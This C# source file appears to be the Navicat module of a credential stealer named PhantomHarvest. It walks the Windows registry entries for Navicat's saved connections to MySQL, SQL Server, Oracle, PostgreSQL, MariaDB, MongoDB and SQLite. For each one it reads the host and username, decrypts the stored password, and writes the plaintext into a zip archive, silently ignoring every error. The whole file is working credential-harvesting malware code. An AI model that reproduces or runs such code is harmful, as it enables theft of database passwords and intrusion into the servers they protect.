using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class Navicat
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				if (Registry.CurrentUser.OpenSubKey("Software\\PremiumSoft") != null)
				{
					string pwd = Navicat.DecryptPwd();
					if (!string.IsNullOrEmpty(pwd))
					{
						using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(pwd)))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, Navicat.ToolName + "/Navicat.txt", ms, DateTime.Now, "");
						}
					}
				}
			}
			catch
			{
			}
		}

		public static string DecryptPwd()
		{
			StringBuilder stringBuilder = new StringBuilder();
			Navicat11Cipher navicat11Cipher = new Navicat11Cipher();
			Dictionary<string, string> dictionary = new Dictionary<string, string>
			{
				{
					"Navicat",
					"MySql"
				},
				{
					"NavicatMSSQL",
					"SQL Server"
				},
				{
					"NavicatOra",
					"Oracle"
				},
				{
					"NavicatPG",
					"pgsql"
				},
				{
					"NavicatMARIADB",
					"MariaDB"
				},
				{
					"NavicatMONGODB",
					"MongoDB"
				},
				{
					"NavicatSQLite",
					"SQLite"
				}
			};
			foreach (string text in dictionary.Keys)
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\PremiumSoft\\" + text + "\\Servers");
				if (registryKey != null)
				{
					stringBuilder.AppendLine("DatabaseName: " + dictionary[text]);
					foreach (string text2 in registryKey.GetSubKeyNames())
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey(text2);
						if (registryKey2 != null)
						{
							try
							{
								string str = registryKey2.GetValue("Host").ToString();
								string str2 = registryKey2.GetValue("UserName").ToString();
								string ciphertext = registryKey2.GetValue("Pwd").ToString();
								stringBuilder.AppendLine("ConnectName: " + text2);
								stringBuilder.AppendLine("hostname: " + str);
								stringBuilder.AppendLine("ConnectName: " + str2);
								stringBuilder.AppendLine("password: " + navicat11Cipher.DecryptString(ciphertext));
								stringBuilder.AppendLine();
							}
							catch
							{
							}
						}
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string ToolName = "Navicat";
	}
}
